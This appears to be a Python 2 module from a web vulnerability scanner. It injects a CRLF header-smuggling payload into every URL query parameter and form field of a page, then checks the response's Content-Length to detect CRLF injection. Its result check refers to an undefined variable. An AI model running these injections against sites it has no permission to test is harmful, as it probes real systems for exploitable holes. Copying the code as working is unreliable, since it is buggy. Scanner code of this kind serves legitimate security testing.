from utils import modify_parameter, update_url_params, get_url_query
from client import NotAPage, RedirectedToExternal

BODY = u'o'
CLRF_SEQUENCE = (
    u"Content-Type: text/html\r\n" +
    u"Content-Length: %d\r\n\r\n" % len(BODY))
ATTACK_SEQUENCE = CLRF_SEQUENCE + BODY

def clrf(page, client):
    print "Testing for CLRF in page {}".format(page.url)

    attack_url(page.url, client)

    for form in page.get_forms():
        parameters = dict(form.get_parameters())
        for parameter in parameters:
            injected_parameters = modify_parameter(parameters, parameter, ATTACK_SEQUENCE)

            try:
                res_page = form.send(client, injected_parameters)
                check_clrf(res_page)

            except NotAPage:
                continue
            except RedirectedToExternal:
                continue


def attack_url(url, client):
    query = get_url_query(url)
    report = {}

    for param, value in query.iteritems():
        successed = []
        injected_url = update_url_params(url, {param: ATTACK_SEQUENCE})

        try:
            res_page = client.get(injected_url)
            check_clrf(res_page)
        except NotAPage:
            continue
        except RedirectedToExternal:
            continue

def check_clrf(res_page):
    if res_page.headers.get('Content-Length') == str(len(BODY)):
        print 'CLRF injection in form {}'.format(action)